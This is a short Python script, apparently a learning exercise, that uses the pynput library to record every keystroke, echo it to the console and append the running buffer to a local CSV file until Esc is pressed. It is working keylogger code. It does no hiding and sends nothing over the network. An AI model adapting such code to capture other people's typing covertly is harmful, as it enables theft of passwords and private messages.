from pynput import keyboard

# Variable to store keystrokes
keystrokes = []

# Function to capture the key presses
def on_press(key):
    try:
        # Record the typed character
        keystrokes.append(key.char)
    except AttributeError:
        # Record non-character keys like 'esc' and 'enter'
        keystrokes.append(str(key))

    # Print the captured keystrokes in real-time
    print("".join(keystrokes), end="\r")
    filepath=r'\PYTHON VSCODE\keystroke_data.csv'
    with open(filepath, 'a') as file:
        file.write("".join(keystrokes) + "\n")

# Stop listener when 'esc' is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when escape key is pressed
        return False
     #filepath=r'\PYTHON VSCODE\keystroke_data.csv'
     #with open(filepath, 'a') as file:
     #file.write("".join(keystrokes) + "\n")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
